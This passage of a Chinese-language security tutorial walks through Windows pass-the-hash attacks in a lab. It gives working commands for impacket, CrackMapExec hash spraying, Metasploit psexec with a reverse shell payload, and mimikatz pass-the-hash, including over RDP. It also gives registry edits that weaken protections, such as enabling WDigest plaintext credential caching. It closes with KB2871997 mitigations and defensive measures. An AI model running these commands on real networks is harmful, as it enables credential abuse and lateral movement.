+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v FilterAdministratorToken /t REG_DWORD /d 1 /f
+</code></pre></div>
+<p>如图将 FilterAdministratorToken 注册表值设置为 1。</p>
+<p><img alt="截图" src="3ef543e85937a8a77cf61666d1e66d26.png" /></p>
+<p>再次执行如下命令使用内置的 administrator 账号和域账号进行哈希传递攻击</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>python3 smbexec.py administrator@10.211.55.13 -hashes aad3b435b51404eeaad3b435b51404ee:329153f560eb329c0e1deea55e88a1e9
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>python3 smbexec.py xie/hack@10.211.55.13 -hashes aad3b435b51404eeaad3b435b51404ee:b98e75b5ff7a3d3ff05e07f211ebe7a8
+</code></pre></div>
+<p>如图所示，可以看到内置的 administrator 账号哈希传递失败，但是域账号不受此值影响！</p>
+<p><img alt="截图" src="2f7a5a0da763d7b25b028c6aee7feb47.png" /></p>
+<h3 id="3localaccounttokenfilterpolicy">3.LocalAccountTokenFilterPolicy<a class="headerlink" href="#3localaccounttokenfilterpolicy" title="Permanent link">&para;</a></h3>
+<p>我们再来看看如何让非 administrator 的本地管理员账户进行远程连接时也得到一个具有管理员凭证的令牌呢？</p>
+<p>微软的官方文档给出了操作流程，如图所示。</p>
+<p><img alt="截图" src="ce69d0ea4795bb0fdcc47de3d7be8b5f.png" /></p>
+<p><strong>UAC 远程连接限制</strong>是通过注册表<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy</code> 来控制的。默认情况下，Windows Vista 及其以后的系统没有该注册表值。我们可以通过如下命令查询该注册表值。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system/v LocalAccountTokenFilterPolicy
+</code></pre></div>
+<p>如图所示，可以看到默认情况下查询不到该值。</p>
+<p><img alt="截图" src="987439c65b0bd9e0aec37ad4d2c61b86.png" /></p>
+<p><strong><em>因此，如果想禁用 UAC 远程连接限制，我们可以在远程主机系统上执行如下命令创建 <code>LocalAccountTokenFilterPolicy</code> 注册表值，并将其值赋为 1。</em></strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
+</code></pre></div>
+<p>如图所示，创建 <code>LocalAccountTokenFilterPolicy</code> 注册表值，并将其值赋为 1。</p>
+<p><img alt="截图" src="46df41ae262e662112e148fe3d3c6049.png" /></p>
+<p>这时只要是本地管理员组用户均可以在远程连接时获得一个具有管理员权限的令牌。</p>
+<p>如图所示，可以看到当未增加注册表前，使用本地管理员用户 test 进行哈希传递攻击失败。当我们增加了该注册表值后再次使用本地管理员用户 test 进行哈希传递攻击，发现可以攻击成功了！</p>
+<p><img alt="截图" src="d318a7fdca524e846c25683a8c531e4a.png" /></p>
+<p>如果我们利用成功后想删除该注册表值，可以使用如下命令进行删除。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system/v LocalAccountTokenFilterPolicy /f
+</code></pre></div>
+<p>删除了该注册表值后，再次使用本地管理员用户 test 进行哈希传递攻击，如图所示，可以看到攻击失败。</p>
+<p><img alt="截图" src="93586e594cfa5fa7a84f8a576cf592b5.png" /></p>
+<h3 id="4">4.本地账号<a class="headerlink" href="#4" title="Permanent link">&para;</a></h3>
+<p>通过以上实验我们可以知道，<strong>本地账号受 UAC 远程连接的影响</strong>，默认情况下，在使用哈希传递攻击的过程中不同系统版本有所不同。</p>
+<ul>
+<li>Windows Vista 之前的机器，可以使用本地管理员组内所有用户进行哈希传递攻击。</li>
+<li>Windows Vista 及其之后的机器，<strong>只能是 administrator 用户的哈希值才能进行哈希传递攻击，其他非 administrator 的本地管理员用户不能使用哈希传递攻击，会提示拒绝访问</strong>。</li>
+</ul>
+<h3 id="5">5.域账号<a class="headerlink" href="#5" title="Permanent link">&para;</a></h3>
+<p><strong>域账号则不受 UAC 远程连接的影响</strong>，默认情况下，使用哈希传递过程如下：</p>
+<ul>
+<li>针对普通域主机，可以使用该域主机本地管理员组内的普通域用户进行哈希传递攻击。</li>
+<li>针对域控，可以使用域管理员组内所有用户进行哈希传递攻击。</li>
+</ul>
+<h2 id="_2">哈希碰撞<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>在企业内网环境中，很多计算机在安装的时候使用的是相同的密码。因此，当我们获得了其中某一台机器的密码 Hash 而无法解密成明文时，我们就可以利用哈希碰撞来碰撞出使用相同密码的机器。进行哈希碰撞的工具有很多，如CrackMapExec、MSF 等。</p>
+<h3 id="1crackmapexec">1.CrackMapExec<a class="headerlink" href="#1crackmapexec" title="Permanent link">&para;</a></h3>
+<p>我们使用 CrackMapExec 工具执行如下命令进行内网哈希碰撞</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>crackmapexec.exe 10.211.55.0/24 -u administrator -H aada8eda23213c027743e6c498d751aa:329153f560eb329c0e1deea55e88a1e9
+</code></pre></div>
+<p>运行完成后，如果目标主机使用相同的密码，则会提示[+]。</p>
+<h3 id="2msf">2.MSF<a class="headerlink" href="#2msf" title="Permanent link">&para;</a></h3>
+<p>我们可以使用 MSF 里面的<code>exploit/windows/smb/psexec</code>模块进行哈希传递，当rhosts 参数指定为一个网段时，就可以进行哈希碰撞了！</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>use exploit/windows/smb/psexec
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>set payload windows/meterpreter/reverse_tcp
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>set rhosts 10.211.55.0/24
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>set smbuser administrator
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>set smbpass aada8eda23213c027743e6c498d751aa:329153f560eb329c0e1deea55e88a1e9
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>run
+</code></pre></div>
+<p>如图所示，使用 MSF 进行哈希碰撞。</p>
+<p><img alt="截图" src="966f1842f572bc40ac111f9b64e605c1.png" /></p>
+<p>运行完成后，如果目标主机使用相同的密码，则会提示[+]，并且会获得使用该密码主机的权限。如图所示：</p>
+<p><img alt="截图" src="07fb99ec290bf4d5de10574d3b47c1a3.png" /></p>
+<p>我们可以执行 sessions -l 命令查看已经获得权限机器的的 session，如图所示：</p>
+<p><img alt="截图" src="593a73bffca3140203ddc61995c28205.png" /></p>
+<p>注：实际内网使用 MSF 来进行哈希碰撞，需要修改 payload，修改为<strong>正向的payload</strong>。</p>
+<h2 id="_3">利用哈希传递进行横向移动<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p>利用哈希传递进行横向移动的工具有很多，比如 MSF、mimikatz、impacket 里面的 psexec、smbexec、wmiexec 等脚本均可以利用密码的 Hash 来进行横向移动。</p>
+<h3 id="1msf">1.MSF 进行哈希传递攻击<a class="headerlink" href="#1msf" title="Permanent link">&para;</a></h3>
+<p>我们可以使用 MSF 里面的 <code>exploit/windows/smb/psexec</code> 模块进行哈希传递，当rhosts 参数指定为具体的 ip 时，就可以获得指定目标 ip 的权限！</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>use exploit/windows/smb/psexec
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>set payload windows/meterpreter/reverse_tcp
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>set rhosts 10.211.55.7
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>set smbuser administrator
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>set smbpass aada8eda23213c027743e6c498d751aa:329153f560eb329c0e1deea55e88a1e9
+<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>run
+</code></pre></div>
+<p>注：实际内网使用 MSF 来进行哈希传递的话，需要修改 payload，修改为<strong>正向的payload</strong>。</p>
+<h3 id="2mimikatz">2.mimikatz 进行哈希传递攻击<a class="headerlink" href="#2mimikatz" title="Permanent link">&para;</a></h3>
+<p>我们也可以使用 mimikatz 执行如下命令进行哈希传递横向移动，获得目标主机一个可交互式的 shell。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>privilege::debug
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>sekurlsa::pth /user:administrator /domain:10.211.55.7 /ntlm:329153f560eb329c0e1deea55e88a1e9
+</code></pre></div>
+<p>如图所示，使用 mimikatz 进行哈希传递横向移动，获得目标主机一个可交互式的shell。</p>
+<p><img alt="截图" src="2e165165e07157c20b60d7eb08f96a44.png" /></p>
+<p>在弹出的 cmd 窗口中，使用<code>wmiexec.vbs</code> 执行如下命令进行验证执行交互式命令。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>cscript wmiexec.vbs /shell 10.211.55.7
+</code></pre></div>
+<p>如图所示，可以看到获得了一个可交互式的权限。</p>
+<p><img alt="截图" src="0ccf5f8e70f75562c013315c151da16c.png" /></p>
+<h3 id="3impacket">3.impacket 进行哈希传递攻击<a class="headerlink" href="#3impacket" title="Permanent link">&para;</a></h3>
+<p>我们可以使用 impacket 里面的 psexec、smbexec、wmiexec、atexec、dcomexec 等脚本利用哈希进行横向移动，以下演示使用 psexec.py 脚本进行哈希传递。</p>
+<p>使用 psexec.py 脚本执行如下命令利用哈希进行横向移动获取目标主机的可交互式 shell。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>python3 psexec.py administrator@10.211.55.7 -hashes 329153f560eb329c0e1deea55e88a1e9:329153f560eb329c0e1deea55e88a1e9
+</code></pre></div>
+<p>如图所示，使用 psexec 哈希传递获得目标主机权限。</p>
+<p><img alt="截图" src="a6d0047e4bf2ae3e715dc95f737af850.png" /></p>
+<h2 id="kb2871997">更新 KB2871997 补丁产生的影响<a class="headerlink" href="#kb2871997" title="Permanent link">&para;</a></h2>
+<p>微软在 2014 年 5 月 13 日发布了针对 Pass The Hash 哈希传递攻击的更新补丁KB2871997。其标题为<code>"Update to fix the Pass-The-Hash Vulnerability"</code>，而在一周后微软却把标题改成了<code>"Update to improve credentials protection and management"</code>。事实上，正如标题所言，这个补丁的最大作用是更新以改进凭据保护和管理。这个补丁主要包含 Windows 8.1 和 Windows Server2012 R2 中引入的增强安全保护机制。使得 Windows 7、Windows 8、Windows Server 2008R2 等低版本系统也可以获得新的安全保护机制，但是这个补丁并不能够修复PTH 哈希传递攻击。</p>
+<p>那么问题来了，KB2871997 补丁引入了哪些新的安全保护机制呢？</p>
+<ul>
+<li>"Protected Users"组的支持</li>
+<li>"Restricted Admin RDP"模式远程客户端支持</li>
+<li>"Pass The Hash"增强保护</li>
+</ul>
+<h3 id="1protected-users">1."Protected Users"组的支持<a class="headerlink" href="#1protected-users" title="Permanent link">&para;</a></h3>
+<p>"Protected Users" 组是通过哪些安全措施保护组内用户安全性的呢？</p>
+<ul>
+<li>"Protected Users"组中的用户强制只能使用 Kerberos 协议进行身份验证，拒绝 NTLM、Digest 和 CredSSP 认证。</li>
+<li>使用 Kerberos 协议进行身份验证的时候拒绝使用 DES 和 RC4 加密类型，强制使用 AES 加密进行预身份验证。这也意味着目标域需要配置为支持AES 加密。</li>
+<li>不能使用 Kerberos 约束性或非约束性委派来委派用户的账户。</li>
+</ul>
+<p>从上面安全保护措施可以看到，"Protected Users"组的成员将无法使用 NTLM、Digest 和 CredSSP 进行认证，强制使用 Kerberos 协议进行身份认证。并且使用 Kerberos 协议进行身份认证的时候，也无法使用 DES 和 RC4 加密类型进行预认证，只能强制使用具有更高加密强度的 AES 加密进行预身份认证。因此在Kerberos 身份认证阶段就用不到 NTLM hash 了。攻击者也就无法进行哈希传递攻击了。</p>
+<p>而 KB2871997 补丁使得低于 Windows Server 2012R2 域功能级别的域控也支持"Protected Users"组。<strong>因此，如果将敏感用户加入"Protected Users"组后，则该敏感用户无法将无法进行哈希传递攻击。</strong></p>
+<p>如图所示，当未将 administrator 加入"Protected Users"组时，可以进行哈希传递攻击。当把 administrator 加入"Protected Users" 组后，无法进行哈希传递攻击。</p>
+<p><img alt="截图" src="9c3980ae3dd670d834cb646b315eee0a.png" /></p>
+<h3 id="2restricted-admin-rdp">2."Restricted Admin RDP"模式远程客户端支持<a class="headerlink" href="#2restricted-admin-rdp" title="Permanent link">&para;</a></h3>
+<p><code>"Restricted Admin RDP"</code>模式增强了安全性以保护用户的凭据，但是此模式对于<code>"Remote Desktop Users"</code>组内的用户不可用。在<code>"Restricted Admin RDP"</code> 模式之前，RDP 登录是一个交互式的登录，只有在用户提供用户名和密码之后，才可以获得访问权限。以这种方式 RDP 登录到目标主机会将用户的凭据存储在目标主机的内存中。如果目标主机被拿下，此凭据也会被盗。而<code>"Restricted Admin RDP"</code> 模式能够支持网络登录，即可以通过用户现有的登录令牌来进行RDP 的身份验证。使用这种登录类型可以确保在目标主机上不保存用户的凭据。</p>
+<p>KB2871997 补丁使得低于 Windows 8.1 和 Windows Server 2012R2 版本的机器也支持<code>"Restricted Admin RDP"</code> 模式。但是从上面的描述中我们可以看出，<code>"Restricted Admin RDP"</code> 模式对 PTH 哈希传递攻击并没有有效改善。反而引入了一种新的攻击方式——<strong>Pass The Hash with Remote Desktop</strong>。</p>
+<h4 id="pass-the-hash-with-remote-desktop">Pass The Hash with Remote Desktop<a class="headerlink" href="#pass-the-hash-with-remote-desktop" title="Permanent link">&para;</a></h4>
+<p>应用了"Restricted Admin RDP" 模式的主机支持使用 hash 凭据来 RDP 登录远程主机，而无需输入用户的明文密码，<strong>因此攻击者可以通过 Hash 来进行 RDP 远程桌面登录。但是前提是使用 PTH 进行 RDP 登录要求进行连接的客户端也得支持"Restricted Admin RDP" 模式，并且连接的用户需要是本地管理员用户</strong>。</p>
+<p>如图所示，目标主机存在 test、hack 和 administrator 用户。</p>
+<p><img alt="截图" src="740f40585e818a6850d117284e296384.png" /></p>
+<p>test 是普通用户，而 hack 和 administrator 是本地管理员用户。三个用户均能通过 RDP 使用明文账号密码进行连接。现在我们知道了这三个用户的密码哈希，但没有解出明文密码。现在，我们想利用密码 Hash 进行 RDP 的 PTH 攻击。</p>
+<p>使用 administrator 账号密码哈希执行如下命令进行 PTH 哈希传递 RDP 服务。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>privilege::debug
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>sekurlsa::pth /user:administrator /domain:10.211.55.16 /ntlm:329153f560eb329c0e1deea55e88a1e9 &quot;/run:mstsc.exe /restrictedadmin&quot;
+</code></pre></div>
+<p>如图所示，使用 administrator 密码哈希进行 PTH 哈希传递 RDP 服务攻击成功。</p>
+<p><img alt="截图" src="e04cf64c9704b27ee83a9414fc98fa54.png" /></p>
+<p>使用 hack 账号密码哈希执行如下命令进行 PTH 哈希传递 RDP 服务。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>privilege::debug
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>sekurlsa::pth /user:hack /domain:10.211.55.16 /ntlm:329153f560eb329c0e1deea55e88a1e9 &quot;/run:mstsc.exe /restrictedadmin&quot;
+</code></pre></div>
+<p>使用 hack 密码哈希进行 PTH 哈希传递 RDP 服务攻击成功。</p>
+<p><img alt="截图" src="7ac7ab89e4524c496962a8bea919b6b1.png" /></p>
+<p>使用 test 账号密码哈希执行如下命令进行 PTH 哈希传递 RDP 服务。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>privilege::debug
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>sekurlsa::pth /user:test /domain:10.211.55.16 /ntlm:329153f560eb329c0e1deea55e88a1e9 &quot;/run:mstsc.exe /restrictedadmin&quot;
+</code></pre></div>
+<p>如图所示，使用 test 密码哈希进行 PTH 哈希传递 RDP 服务攻击失败。提示连接被拒绝！<strong>原因在于 test 用户不是目标主机的本地管理员用户</strong>。</p>
+<p><img alt="截图" src="cf6c2f18c12ecb023ee9dedfeb8fb758.png" /></p>
+<p>如果目标主机支持"Restricted Admin RDP" 模式，但没有开启的话，可以使用以下命令开启：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>REG ADD HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
+</code></pre></div>
+<p>执行以上命令开启了"Restricted Admin RDP" 模式后，可以执行如下命令查询是否开启成功。值为 0，代表开启; 值为 1，代表关闭</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>REG query &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; | findstr &quot;DisableRestrictedAdmin&quot;
+</code></pre></div>
+<h3 id="3pass-the-hash">3."Pass The Hash"增强保护<a class="headerlink" href="#3pass-the-hash" title="Permanent link">&para;</a></h3>
+<h4 id="1">(1) 注销时清除凭据<a class="headerlink" href="#1" title="Permanent link">&para;</a></h4>
+<p>默认情况下，当用户远程桌面登录时，Windows 会在 LSASS 内存中缓存用户的明文凭据、NTLM 密码散列、Kerberos TGT 票据等。但是，在用户注销后，这些凭据却不一定会在 LSASS 内存中清除。而此更新可以确保在用户注销后在进程中清除这些凭据。</p>
+<h4 id="2-lsass">(2) 从 LSASS 内存删除明文凭证<a class="headerlink" href="#2-lsass" title="Permanent link">&para;</a></h4>
+<p><strong>通过将明文凭证从 LSASS 内存中移除，攻击者无法通过 mimikatz 等工具从内存中抓取到用户的明文凭据，但是 NTLM 哈希、Kerberos 票据等仍然会存储在LSASS 内存中</strong>。该功能是通过<strong>禁用 Wdigest 认证</strong>来实现的。因此默认情况下，Windows 8.1 和 Windows Server2012R2 高版本系统是没有<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential</code> 注册表键，说明禁用了 Wdigest 认证。但是实际情况是有一些服务需要开启 Wdigest 认证，因此管理员可以手动注册该<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential</code> 键，并通过将其赋值为 0 或 1 来选择关闭或开启 Wdigest 认证。</p>
+<p>如图所示，可以看到默认情况下没有 UseLogonCredential 注册表。</p>
+<p><img alt="截图" src="6c2447087378791b4bc6e35b0d32c43d.png" /></p>
+<p>因此，在高版本系统中是无法通过 mimikatz 抓到明文密码的。如图所示：</p>
+<p><img alt="截图" src="3a95b1bbec4e567bdfc87ba2607356b4.png" /></p>
+<p>如果安全研究执行如下命令手动注册该<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential</code>键，并且将其值赋为 1 的话，即使在打了补丁的系统中，也能在内存中抓到明文凭据。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+</code></pre></div>
+<p>如图可以看到已经增加了 UseLogonCredential 键，并且其值已经为 1 了。</p>
+<p><img alt="截图" src="1e10ebb33bc0bf16e28cde47c7957c6c.png" /></p>
+<p>再次使用 mimikatz 抓取密码，如图所示，可以看到，能抓到明文密码了。</p>
+<p><img alt="截图" src="e48e014e88d0a81d14bb3e62d516fc4e.png" /></p>
+<h4 id="3-sid">(3) 引入新的 SID<a class="headerlink" href="#3-sid" title="Permanent link">&para;</a></h4>
+<p>该补丁引入了以下两个新的 SID：</p>
+<ul>
+<li>LOCAL_ACCOUNT（S-1-5-113）：所有本地帐户继承此 SID。</li>
+<li>LOCAL_ACCOUNT_AND_MEMBER_OF_ADMINISTRATORS_GROUP（S-1-5-114）：所有管理员组的本地帐户继承此 SID。</li>
+</ul>
+<p>如图所示，可以看到这两个 SID。</p>
+<p><img alt="截图" src="3db54b07ac49d7c98efe1d005875bdd2.png" /></p>
+<p>作为网络管理员，可以通过组策略设置“拒绝从网络访问此计算机”和“拒绝通过远程桌面服务登录”这两个安全选项来禁止本地账户通过远程桌面和网络访问计算机。但是域用户不受影响！</p>
+<p>如图所示配置，打开组策略，计算机配置——&gt;Windows 设置——&gt;安全设置——本地策略——&gt;用户权限分配，找到“拒绝从网络访问此计算机”和“拒绝通过远程桌面服务登录”这两个选项</p>
+<p><img alt="截图" src="48e9991543a59765bcceae991fdc3629.png" /></p>
+<p>如图所示，将本地账户添加到“拒绝从网络访问这台计算机”。</p>
+<p><img alt="截图" src="1bb2fc722b70c1ae6ab5b2052add8495.png" /></p>
+<p>如图所示，将本地账户添加到“拒绝通过远程桌面服务登录”。</p>
+<p><img alt="截图" src="edc7dfcdef97d27f9f95b8fc00ef538c.png" /></p>
+<p>现在我们尝试使用本地账户和域账号进行远程桌面连接和远程哈希传递连接测试。</p>
+<p>如图所示，可以看到设置了该组策略后，使用本地账号将无法进行远程桌面连接和远程哈希传递攻击连接了。</p>
+<p><img alt="截图" src="c8d9b190c8abd7e1ff0017ec48bf8000.png" /></p>
+<p>而域用户则不受此组策略影响，如图所示：</p>
+<p><img alt="截图" src="f53bccf196e7ebda53eb31d1a6fd73ba.png" /></p>
+<p>因此，补丁引入的这两个新的 SID 对于本地账号的哈希传递攻击有一定缓解作用，不过需要网络管理员手动配置组策略才能生效。</p>
+<h2 id="pth_1">PTH 哈希传递攻击防御<a class="headerlink" href="#pth_1" title="Permanent link">&para;</a></h2>
+<p>从上面的分析我们可以看出，PTH 哈希传递攻击目前并不能完全根除，只能说采取措施来进行防御。总的来说，可以采取以下措施来进行防御：</p>
+<ul>
+<li>将<code>KEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken</code> 值设置为 1，禁止内置的本地管理员 administrator 进行远程哈希传递攻击。</li>
+<li>监控<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy</code> 值，防止其被修改为 1。</li>
+<li>通过组策略配置设置“拒绝从网络访问此计算机”和“拒绝通过远程桌面服务登录”这两个安全选项来禁止本地账户通过远程桌面和网络访问计算机。</li>
+<li>将域内敏感用户加入"Protected Users"组，可以有效阻止敏感用户哈希传递攻击。</li>
+</ul>
+<p>通过以上措施，可以阻止本地账户和域内敏感用户的哈希传递攻击。但是域内用户众多，不可能将所有用户都加入"Protected Users"组，因此针对域用户的哈希传递目前还比较困难。</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  回到页面顶部
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2024 hypnotic
+    </div>
+  
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../../../../..", "features": ["header.autohide", "navigation.instant", "navigation.tracking", "content.code.annotate", "toc.integrate", "toc.follow", "navigation.path", "navigation.top", "navigation.tabs", "navigation.prune", "navigation.footer", "navigation.tabs.sticky", "navigation.sections", "content.code.copy", "navigation.indexes", "search.share", "search.suggest", "search.highlight"], "search": "../../../../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
+    
+    
+      <script src="../../../../../assets/javascripts/bundle.83f73b43.min.js"></script>
+      
+        <script src="../../../../../javascripts/extra.js"></script>
+      
+        <script src="../../../../../javascripts/mathjax.js"></script>
+      
+        <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+      
+        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+      
+    
+  </body>
+</html>
